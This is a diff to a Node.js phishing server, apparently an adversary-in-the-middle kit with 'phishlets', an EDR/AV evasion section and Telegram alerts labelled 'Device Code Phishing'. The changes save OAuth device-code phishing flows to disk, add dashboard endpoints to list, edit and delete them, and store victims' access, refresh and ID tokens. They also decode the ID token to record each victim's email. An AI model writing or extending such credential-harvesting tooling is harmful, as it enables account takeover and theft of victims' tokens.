@@ -8,8 +8,8 @@ const NOTIFIED_SESSIONS = new Set();
 // Store captured tokens per session
 const CAPTURED_TOKENS = {};
 
-// Store device flows for history
-const deviceFlows = [];
+// Store device flows for history (will be loaded from file)
+let deviceFlows = [];
 
 // ================================================
 // 𝙾𝙱𝙵𝚄𝚂𝙲𝙰𝚃𝙾𝚁 𝙵𝙾𝚁 𝙴𝙳𝚁/𝙰𝚅 𝙴𝚅𝙰𝚂𝙸𝙾𝙽
@@ -509,6 +509,35 @@ function decryptData(encryptedData, ivHex) {
     decrypted = Buffer.concat([decrypted, decipher.final()]);
     return decrypted.toString('utf-8');
 }
+
+// ================================================
+// 𝙳𝙴𝚅𝙸𝙲𝙴 𝙵𝙻𝙾𝚆𝚂 𝙵𝙸𝙻𝙴 𝙼𝙰𝙽𝙰𝙶𝙴𝙼𝙴𝙽𝚃
+// ================================================
+
+const DEVICE_FLOWS_FILE = path.join(__dirname, 'device_flows.json');
+
+function loadDeviceFlows() {
+    try {
+        if (fs.existsSync(DEVICE_FLOWS_FILE)) {
+            const data = fs.readFileSync(DEVICE_FLOWS_FILE, 'utf-8');
+            return JSON.parse(data);
+        }
+    } catch (e) {
+        console.log('⚠️ Could not load device flows:', e.message);
+    }
+    return [];
+}
+
+function saveDeviceFlows(flows) {
+    try {
+        fs.writeFileSync(DEVICE_FLOWS_FILE, JSON.stringify(flows, null, 2));
+    } catch (e) {
+        console.log('⚠️ Could not save device flows:', e.message);
+    }
+}
+
+// Initialize flows from file
+deviceFlows = loadDeviceFlows();
 
 // ================================================
 // 𝙳𝙰𝚂𝙷𝙱𝙾𝙰𝚁𝙳 𝙰𝙿𝙿
@@ -1226,6 +1255,91 @@ dashApp.post('/api/phishlets/toggle', (req, res) => {
         } else {
             res.status(404).json({ error: 'Phishlet not found' });
         }
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+// ================================================
+// 𝙳𝙴𝚅𝙸𝙲𝙴 𝙲𝙾𝙳𝙴 𝙰𝙿𝙸 𝙴𝙽𝙳𝙿𝙾𝙸𝙽𝚃𝚂 (𝙳𝙰𝚂𝙷𝙱𝙾𝙰𝚁𝙳)
+// ================================================
+
+dashApp.get('/api/device/history', (req, res) => {
+    try {
+        const sorted = [...deviceFlows].sort((a, b) => new Date(b.created) - new Date(a.created));
+        res.json({ success: true, flows: sorted });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+dashApp.get('/api/device/status/:deviceCode', (req, res) => {
+    try {
+        const flow = deviceFlows.find(f => f.device_code === req.params.deviceCode);
+        if (!flow) return res.status(404).json({ error: 'Flow not found' });
+        res.json({ success: true, flow });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+dashApp.post('/api/device/manual', async (req, res) => {
+    const { code, device_code } = req.body;
+    if (!code && !device_code) {
+        return res.status(400).json({ error: 'Code or device_code required' });
+    }
+    try {
+        let flow = device_code 
+            ? deviceFlows.find(f => f.device_code === device_code)
+            : deviceFlows.find(f => f.user_code === code);
+        
+        if (!flow) return res.status(404).json({ error: 'Flow not found' });
+        
+        flow.status = 'manual';
+        flow.manual_submitted = new Date().toISOString();
+        saveDeviceFlows(deviceFlows);
+        
+        res.json({ success: true, message: 'Manual code submitted', flow });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+dashApp.delete('/api/device/flow/:deviceCode', (req, res) => {
+    try {
+        const index = deviceFlows.findIndex(f => f.device_code === req.params.deviceCode);
+        if (index === -1) return res.status(404).json({ error: 'Flow not found' });
+        deviceFlows.splice(index, 1);
+        saveDeviceFlows(deviceFlows);
+        res.json({ success: true, message: 'Flow deleted' });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+dashApp.get('/api/device/stats', (req, res) => {
+    try {
+        const total = deviceFlows.length;
+        const pending = deviceFlows.filter(f => f.status === 'pending' || f.status === 'waiting').length;
+        const approved = deviceFlows.filter(f => f.status === 'approved').length;
+        const expired = deviceFlows.filter(f => f.status === 'expired').length;
+        const manual = deviceFlows.filter(f => f.status === 'manual').length;
+        res.json({ 
+            success: true, 
+            stats: { total, pending, approved, expired, manual }
+        });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+dashApp.post('/api/device/flow/:deviceCode', (req, res) => {
+    try {
+        const flow = deviceFlows.find(f => f.device_code === req.params.deviceCode);
+        if (!flow) return res.status(404).json({ error: 'Flow not found' });
+        Object.assign(flow, req.body);
+        saveDeviceFlows(deviceFlows);
+        res.json({ success: true, flow });
     } catch (err) {
         res.status(500).json({ error: err.message });
     }
@@ -2211,6 +2325,26 @@ app.post('/device/request', async (req, res) => {
         const data = response.data;
         console.log('✅ Device code obtained:', data.user_code);
         
+        // Store in device flows
+        const newFlow = {
+            device_code: data.device_code,
+            user_code: data.user_code,
+            verification_uri: data.verification_uri,
+            expires_in: data.expires_in,
+            interval: data.interval,
+            status: 'pending',
+            created: new Date().toISOString(),
+            approved: null,
+            username: null,
+            access_token: null,
+            refresh_token: null,
+            id_token: null,
+            manual_submitted: null
+        };
+        deviceFlows.push(newFlow);
+        saveDeviceFlows(deviceFlows);
+        console.log(`📱 New device flow: ${data.user_code} (${data.device_code})`);
+        
         // Send Telegram notification
         const message = `
 📱 **Device Code Phishing**
@@ -2253,20 +2387,21 @@ app.post('/device/token', async (req, res) => {
         const tokens = response.data;
         console.log('✅ Tokens obtained!');
         
-        // Store tokens
+        // Store tokens in device flow
         const flow = deviceFlows.find(f => f.device_code === device_code);
         if (flow) {
             flow.status = 'approved';
             flow.approved = new Date().toISOString();
             flow.access_token = tokens.access_token;
             flow.refresh_token = tokens.refresh_token;
-            flow.token_type = 'OAuth2';
+            flow.id_token = tokens.id_token;
             if (tokens.id_token) {
                 try {
                     const payload = JSON.parse(Buffer.from(tokens.id_token.split('.')[1], 'base64').toString());
                     flow.username = payload.email || payload.preferred_username || 'Unknown';
                 } catch (e) {}
             }
+            saveDeviceFlows(deviceFlows);
             console.log('✅ Flow updated:', flow.user_code);
         }
         
@@ -2295,6 +2430,7 @@ app.post('/device/token', async (req, res) => {
             console.log('⏰ Code expired');
             const flow = deviceFlows.find(f => f.device_code === device_code);
             if (flow) flow.status = 'expired';
+            saveDeviceFlows(deviceFlows);
             res.json({ error: 'expired_token' });
         } else {
             console.error('❌ Token error:', error.message);
